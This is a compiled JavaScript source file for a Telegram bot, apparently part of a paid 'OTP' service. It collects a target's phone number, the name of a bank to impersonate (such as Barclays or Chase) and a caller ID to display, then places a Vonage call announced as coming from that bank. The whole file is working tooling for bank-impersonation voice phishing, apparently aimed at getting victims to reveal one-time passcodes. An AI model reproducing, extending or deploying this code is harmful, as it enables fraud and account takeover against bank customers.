"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.callOnNumInputScene = void 0;
const telegraf_1 = require("telegraf");
const server_1 = require("../server");
const vonage_1 = require("../utils/vonage");
const getUser_1 = require("../utils/getUser");
exports.callOnNumInputScene = new telegraf_1.Scenes.WizardScene('CALL_ID_ON_NUM_INPUT', (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    var _a, _b, _c;
    try {
        const { hasExpired } = yield getUser_1.getUser({ id: (_a = ctx.from) === null || _a === void 0 ? void 0 : _a.id });
        if (hasExpired) {
            yield ctx.replyWithHTML(`👋 <b>Welcome back ${(_b = ctx.from) === null || _b === void 0 ? void 0 : _b.first_name}</b>,\n\nYour subscirption has <b>expired.</b>`, telegraf_1.Markup.inlineKeyboard([
                telegraf_1.Markup.button.callback('Renew', 'buy'),
            ]));
            return ctx.scene.leave();
        }
    }
    catch (error) {
        yield ctx.replyWithHTML(`😃 <b>Welcome ${(_c = ctx.from) === null || _c === void 0 ? void 0 : _c.first_name}</b>,\n\n🛒 1 Month subscription\n💲 Price: <b>$${process.env.OTP_PRICE}</b>\n\nTo purchase click the buy button below and you will be prompted to select a currency`, telegraf_1.Markup.inlineKeyboard([
            telegraf_1.Markup.button.callback('Buy', 'buy'),
        ]));
        return ctx.scene.leave();
    }
    if (!ctx.message || !ctx.wizard.state.callData) {
        yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
        return ctx.scene.leave();
    }
    const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(ctx.message.text);
    if (!numValid) {
        yield ctx.reply(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `);
        return;
    }
    yield ctx.replyWithHTML(`Good,\nReply with the bank name 🏦\n(e.g ${/^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(ctx.wizard.state.callData.number)
        ? 'Barclays'
        : 'Chase'})\n\n<i>***request will expire in 2 minutes***</i>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
    return ctx.wizard.next();
}), (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    if (!ctx.message || !ctx.wizard.state.callData) {
        yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
        return ctx.scene.leave();
    }
    const numValid = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(ctx.wizard.state.callData.number);
    if (!numValid) {
        yield ctx.reply(`Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `);
        return;
    }
    yield ctx.replyWithHTML(`Okay,\nReply with the caller ID 👤\n(e.g ${/^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(ctx.message.text)
        ? '448081961740'
        : '18882019292'})\n\n<i>***request will expire in 2 minutes***</i>`);
    ctx.wizard.state.callData.institutionName = ctx.message.text;
    return ctx.wizard.next();
}), (ctx) => __awaiter(void 0, void 0, void 0, function* () {
    if (!ctx.message) {
        yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
        return ctx.scene.leave();
    }
    ctx.wizard.state.callData.callerId = ctx.message.text;
    ctx.wizard.state.userCalling = {
        [ctx.wizard.state.callData.number]: ctx.chat.id,
    };
    const { number, institutionName, callerId } = ctx.wizard.state.callData;
    const from = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(number)
        ? process.env.UK_NUM
        : process.env.US_NUM;
    yield ctx.reply(`Calling ${number}\nfrom ${callerId} as:\n\n${institutionName} 📲...`);
    yield server_1.server(ctx);
    yield vonage_1.vonageMakeACall({
        from,
        to: number,
        institutionName: institutionName,
    });
}));
